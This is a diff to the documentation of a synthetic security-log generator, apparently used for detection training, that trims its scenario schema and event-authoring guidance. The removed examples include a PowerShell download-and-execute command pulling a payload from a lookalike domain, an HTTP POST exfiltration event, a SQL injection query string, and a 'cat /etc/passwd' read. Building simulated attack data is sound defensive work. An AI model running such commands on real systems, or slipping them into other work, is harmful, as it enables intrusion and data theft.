@@ -220,36 +220,14 @@ environment:
         direction: bidirectional  # bidirectional | inbound | outbound
         placement: span           # span mirrors segment traffic | tap observes uplink/boundary traffic
         log_formats: [zeek]
-      - type: firewall            # Cisco ASA firewall sensor
-        name: fw01
-        hostname: fw01
-        monitoring_segments: [corporate_lan, server_vlan, dmz]
-        placement: tap
-        direction: bidirectional
-        log_formats: [cisco_asa]
-        interfaces:               # Map segments to ASA interface names
-          corporate_lan: inside
-          server_vlan: inside
-          dmz: dmz
-        default_action: deny      # Standard firewall practice
-        deny_ratio: 5.0           # ~5 denies per allow in baseline
-        policy:                   # First-match-wins (like real ACLs)
-          - {src: external, dst: dmz, ports: [80, 443]}
-          - {src: corporate_lan, dst: any}
-          - {src: server_vlan, dst: external, ports: [80, 443, 53]}
-          - {src: server_vlan, dst: server_vlan}
-        nat_rules:                # NAT translation rules
-          - {type: dynamic_pat, src: corporate_lan, mapped_ip: "45.83.220.1"}
-          - {type: static, real_ip: "10.10.20.10", mapped_ip: "45.83.220.10"}
+      # Firewall sensors (type: firewall) add: interfaces, default_action,
+      # deny_ratio, policy rules, nat_rules, threat_detection_rate.
+      # See /eforge:references:scenario-reference for the full firewall schema.
 
 personas:                         # Define inline or reference pre-built from personas/
-  - name: developer
+  - name: developer               # Only needed for custom personas; pre-built ones resolve by name
     description: "Software developer"
-    typical_activities:
-      - "Write and edit source code"
-      - "Run builds and tests"
     work_hours: "9am-5pm (lunch 12pm-1pm)"
-    application_usage: ["VS Code", "Terminal", "Chrome"]
     risk_profile: low             # low | medium | high
 
 time_window:
@@ -308,42 +286,7 @@ output:
   compression: false
 ```
 
-### Firewall NAT Rules
-
-- `nat_rules`: NAT translation rules. Each rule specifies how traffic crossing the firewall boundary gets address-translated.
-  - `type`: `"dynamic_pat"` (many:1 with port translation) or `"static"` (1:1 IP mapping)
-  - `src`: Source segment name(s), IP, or CIDR. Accepts a string or list (e.g., `[workstations, servers]`)
-  - `mapped_ip`: The post-NAT IP address
-  - `real_ip`: (static only) The specific internal IP being mapped
-  - Dynamic PAT: all traffic from matching segments shares one external IP with port translation. Common for outbound user traffic.
-  - Static NAT: bidirectional 1:1 mapping for DMZ servers. Enables inbound connections via public IP.
-  - NAT only applies to permitted connections that cross segment boundaries. Denied connections are not NATted.
-  - ASA logs both real and mapped IPs in Built messages. Outside Zeek sensors see post-NAT IPs; inside sensors see real IPs.
-
-### OS-Aware Log Routing
-
-The `os` field on systems determines which native log formats are generated:
-- **Windows** (Windows 10, Windows 11, Windows Server 2019, etc.) → Windows Event Security logs + Sysmon
-- **Linux** (Ubuntu, CentOS, Debian, RHEL, etc.) → syslog + bash_history (per-user files for all admin users who SSH to the server, with organic admin commands)
-- **eCAR** (format) → Optional EDR/XDR layer, works on any OS (only emitted if in output logs list)
-- **Zeek, Snort, Cisco ASA** → Network-level, OS-agnostic (driven by network sensor configuration)
-- **Cisco ASA** → Firewall allow/deny logs; requires `type: firewall` sensor with `policy` rules and `interfaces` mapping
-- **web_access** → Generated for systems with `roles: [web_server]`
-- **proxy_access** → Generated for systems with `roles: [forward_proxy]`; logs outbound HTTP/HTTPS routed through the proxy as W3C Extended rows, with CONNECT entries for HTTPS, cache HIT/MISS, and full destination URLs. Current proxy behavior assumes TLS interception, so HTTPS can include both CONNECT and inspected request rows.
-
-If `proxy_access` is included in `output.logs`, include at least one proxy system with `roles: [forward_proxy]` and a generic proxy service label such as `forward_proxy`; otherwise validation warns and no proxy log file will be generated. Also set `environment.proxy.mode`: use `transparent` when Zeek/IDS should show direct-looking client→origin traffic, or `explicit` for PAC/browser-configured proxies where Zeek/IDS/firewall sources should show client→proxy plus proxy→origin legs. In explicit mode, denied proxy requests stop at the proxy and do not emit proxy→origin evidence. For explicit mode, set `listener_port` (default/warning fallback: 8080). Non-intercepting tunnel-only HTTPS proxy behavior is not modeled yet.
-
-For realism, try to provide both `roles` and `services` on non-workstation hosts. The generator uses them to compile the world model that drives infrastructure-aware background traffic and realistic remote-session paths.
-
-### Database Service Inference
-
-Database hosts (`roles: [database]`) automatically infer the DB engine from `services`. When `services` is empty, the OS determines the default: **Linux → PostgreSQL** (port 5432), **Windows → MSSQL** (port 1433). Traffic generation only routes connections to hosts running the matching engine — mixed-DB environments get correct per-engine routing.
-
-### External Inbound Requirements
-
-External inbound traffic requires a reachable public address. Hosts with a static NAT VIP use it automatically. Hosts with a directly-public IP work as-is. **RFC1918 hosts without a VIP cannot receive external inbound traffic** — configure a `nat_rules` static mapping or use a public IP if external traffic is needed.
-
-Use the `/eforge:references:evidence-formats` skill for detailed field documentation, output paths, and known limitations for each log format.
+Log format routing, proxy configuration, database service inference, firewall NAT rules, and external inbound requirements are documented in `/eforge:references:scenario-reference`. For output field documentation and known limitations, use `/eforge:references:evidence-formats`.
 
 ### Validation Rules
 
@@ -419,116 +362,19 @@ When building storyline events, each entry needs an `events` list with typed dec
 - `workstation_lock` — Lock workstation (4800). No additional fields.
 - `workstation_unlock` — Unlock workstation (4801 + 4624 type 7 re-auth). No additional fields.
 
-The `raw` type targets a specific output format with arbitrary fields — use it for events without a dedicated type (e.g., custom syslog messages, specific Windows events). Requires `target_format` and `fields` dict. Raw events bypass cross-format correlation, so prefer typed events when available.
+The `raw` type targets a specific output format with arbitrary fields — use it for events without a dedicated type. Requires `target_format` and `fields` dict. Raw events bypass cross-format correlation, so prefer typed events when available.
 
-**Process execution:**
-```yaml
-events:
-  - type: process
-    process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-    command_line: "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://cdn-assets-update.com/payload.ps1')\""
-    technique: "T1059.001 - PowerShell"
-  - type: connection               # Pair with connection so domain appears in DNS/SSL/proxy
-    dst_ip: "45.83.221.50"
-    dst_port: 443
-    hostname: "cdn-assets-update.com"
-    service: ssl
-```
+**Key authoring rules:**
 
-Prefer full process image paths when you know the correct path. Bare executable names are accepted when the path is uncertain; generation normalizes them through the configured application/process catalog so Windows and Linux logs get canonical image paths. If a scenario needs a custom install location, add or update the relevant application/process overlay instead of inventing a one-off path in the storyline.
+- **Process + connection pairing:** When a command line references a domain (Invoke-WebRequest, curl, wget), always add a paired `connection` event with `hostname` set. Without it, the domain appears in Sysmon but is absent from DNS, SSL, HTTP, and proxy logs. For raw-IP commands, the connection alone (no `hostname`) is sufficient.
+- **HTTP visibility:** For `service: http` connections, specify `method`, `uri`, and `user_agent`. Without them the engine auto-generates generic metadata that won't reflect actual attack activity. For `service: ssl`, these fields aren't needed.
+- **`hostname` on connections:** Use the client-facing DNS name actually resolved by the endpoint — not a reverse-DNS/PTR artifact. This keeps DNS, TLS SNI, x509 subject, and proxy logs consistent. Omit `hostname` for raw-IP C2.
+- **No documentation domains in generated data:** Don't use `example.com`, `example.net`, or `example.org` as live public infrastructure — they're an obvious synthetic tell. Use a realistic non-reserved domain.
+- **Prefer full image paths:** Bare executable names are accepted but full paths produce more accurate logs. Don't invent one-off paths — add a config overlay entry instead.
+- **Linux commands:** Use `type: process` with Linux binary paths (`/usr/bin/cat`, `/bin/bash`).
+- **Web attacks:** Use `connection` with `service: http`, not `raw` with `target_format: web_access` — the latter bypasses cross-source correlation.
 
-IMPORTANT: When a process command line references a domain URL (Invoke-WebRequest, DownloadString, curl, wget), always add a paired `connection` event with `hostname` set. Without it, the domain will appear in Sysmon but be completely absent from DNS, SSL, HTTP, and proxy logs — a glaring cross-source inconsistency. For raw-IP URLs, the connection alone (without `hostname`) is sufficient.
-
-**Network connections (C2, exfiltration):**
-
-IMPORTANT: For C2 and exfiltration connections, always specify `method`, `uri`, and `user_agent` when using `service: http`. Without these fields, the engine auto-generates generic HTTP metadata (random URIs like `/favicon.ico`) that won't reflect the actual attack activity in Zeek http.log or proxy logs. For `service: ssl` (HTTPS), the HTTP layer is encrypted and not visible to Zeek, so these fields aren't needed — but the connection will still appear in conn.log and ssl.log.
-
-IMPORTANT: When a connection uses a domain name (not a raw IP), set `hostname` on the connection event. Use the client-facing DNS name the endpoint actually resolved and sent in HTTP Host, TLS SNI, or proxy CONNECT metadata. Do not use a reverse-DNS/PTR artifact or provider-generated infrastructure name unless the scenario explicitly says the client connected with that name. This ensures DNS, SSL SNI, x509 certificate subject, and proxy logs carry the same realistic name. Omit `hostname` for raw-IP C2 (no DNS lookup expected).
-
-For realism-bound generated datasets, do not use reserved documentation domains (`example.com`, `example.net`, `example.org`) as if they were live public infrastructure. They are fine in documentation snippets, but successful public DNS/TLS/proxy evidence for those domains is an obvious synthetic tell. Use a scenario-owned lab domain or a realistic non-reserved domain when the logs should show public resolver answers and certificates.
-
-```yaml
-events:
-  - type: connection
-    dst_ip: "45.83.221.10"
-    dst_port: 443
-    hostname: "cdn-assets-update.com"   # Domain for DNS/SSL/proxy
-    service: "ssl"
-    technique: "T1071.001 - Web Protocols"
-```
-
-**Exfiltration over HTTP (include method/uri for http.log visibility):**
-```yaml
-events:
-  - type: connection
-    dst_ip: "45.83.221.10"
-    dst_port: 80
-    service: http
-    method: "POST"
-    uri: "/api/v2/upload"
-    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-    status_code: 200
-    technique: "T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol"
-```
-
-**HTTP requests (web attacks, web shell access):**
-Use `connection` with `service: http` for web-based attacks. This produces correlated web_access + zeek_http + zeek_conn records. Do NOT use `raw` with `target_format: web_access` — that bypasses cross-source correlation.
-```yaml
-events:
-  - type: connection
-    dst_ip: "10.10.20.10"
-    dst_port: 80
-    service: http
-    source_ip: "104.248.71.33"
-    method: "GET"
-    uri: "/ehr/login.php?id=1' OR 1=1--"
-    status_code: 200
-    user_agent: "Mozilla/5.0 (compatible; Googlebot/2.1)"
-    technique: "T1190 - Exploit Public-Facing Application"
-```
-
-**Authentication (logon/failed logon):**
-```yaml
-events:
-  - type: logon
-    source_ip: "10.0.1.50"
-    logon_type: 3    # 3=network, 10=RDP, 2=interactive
-    technique: "T1078 - Valid Accounts"
-```
-
-**SSH/RDP lateral movement (compound events — produces network + host logs):**
-```yaml
-events:
-  - type: ssh_session   # or rdp_session
-    source_ip: "10.0.1.50"
-    technique: "T1021.004 - Remote Services: SSH"
-```
-
-**Linux commands (use process type with Linux binary paths):**
-```yaml
-events:
-  - type: process
-    process_name: "/usr/bin/cat"
-    command_line: "cat /etc/passwd"
-    technique: "T1087.001 - Account Discovery: Local Account"
-```
-
-**Causal expansion — auto-generated prerequisite events:** The generation engine automatically emits prerequisite and consequent events with realistic timing offsets from `config/activity/timing_profiles.yaml`. You do NOT need to manually specify these as prerequisites:
-
-- **DNS before connections** — TCP connections auto-generate a DNS lookup before the connection, with caching, SERVFAIL probability, and NXDOMAIN companions. Baseline web/SaaS connections use domain-first selection for consistent DNS/SNI/proxy hostnames. Storyline connections with `hostname` set always emit DNS; connections without `hostname` skip DNS (correct for raw-IP C2)
-- **Kerberos before logons** — Kerberos-authenticated Windows domain logons auto-generate TGT (4768) and TGS (4769) on the DC; elevated-session 4672 is emitted on the host where the 4624 logon session is created
-- **Remote auth network evidence** — Windows remote logon and failed-logon events carry source ports from canonical session/attempt context; when network logs are visible, auth-bearing attempts use established or reset-after-payload connection evidence rather than SYN-only probes
-- **ProcessAccess after lsass injection** — `create_remote_thread` targeting lsass.exe auto-generates Sysmon Event 10 after the remote-thread event
-- **Audit events from commands** — Process events with admin commands (`net user /add`, `sc create`, `schtasks /create`, `wevtutil cl`) auto-generate the corresponding Windows audit events (4720, 4726, 4728, 4697, 4698, 1102)
-- **DNS for RDP/SSH** — `rdp_session` and `ssh_session` auto-generate DNS + connection events
-- **RSAT sessions for DCs** — When the environment contains domain controllers and admin personas (sysadmin/help_desk), the baseline auto-generates correlated RSAT sessions: mmc.exe + DLL loads on the admin workstation, LDAP/RPC connections from workstation to DC, and type 3 logon on the DC. No scenario configuration needed
-
-**When to manually specify these event types:** Only when they are part of the attack narrative itself — not as prerequisites for another event. For example:
-- DNS tunneling exfiltration → manually declare the DNS `connection` events (they ARE the attack, not a prerequisite)
-- Kerberos golden ticket forging → manually declare the Kerberos events
-- Explicit credential dumping via process access → use `create_remote_thread` with `target_process: lsass.exe`; the engine auto-generates the corresponding ProcessAccess (Sysmon Event 10)
-
-The validator warns if it detects potentially redundant manual specifications alongside events that would auto-generate them.
+**Causal expansion — auto-generated prerequisite events:** The engine automatically emits DNS lookups before TCP connections, Kerberos TGT/TGS before domain logons, ProcessAccess after lsass `create_remote_thread`, audit events from admin command patterns, and RSAT session evidence for DC admin activity. Only specify these manually when they are the attack narrative itself (DNS tunneling, golden ticket forging). The validator warns on redundant manual specifications.
 
 For realism-bound scenarios, do not use RFC 5737 TEST-NET ranges (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`) for public NATs, C2, scanners, or attacker infrastructure. Those ranges are safe for documentation snippets, but they are an obvious synthetic-data tell in generated logs. Use private ranges (10.x, 172.16-31.x, 192.168.x) for internal systems, and use a scenario-owned lab public allocation or generated non-reserved public-looking addresses for external infrastructure.
 
@@ -704,9 +550,3 @@ If the user wants to immediately generate logs, suggest using `/eforge generate`
 
 When generation completes, the output directory will contain a `GROUND_TRUTH.md` file with the full attack timeline, IOCs, and answer key. Let the user know this exists and where to find it.
 
-## Future Enhancements
-
-These features are planned but not yet implemented:
-- Network diagram ingestion (Mermaid, Graphviz) to auto-generate network topology
-- Full user directory export as a separate CSV file for large scenarios
-- Authentication and naming convention documentation in ENVIRONMENT.md
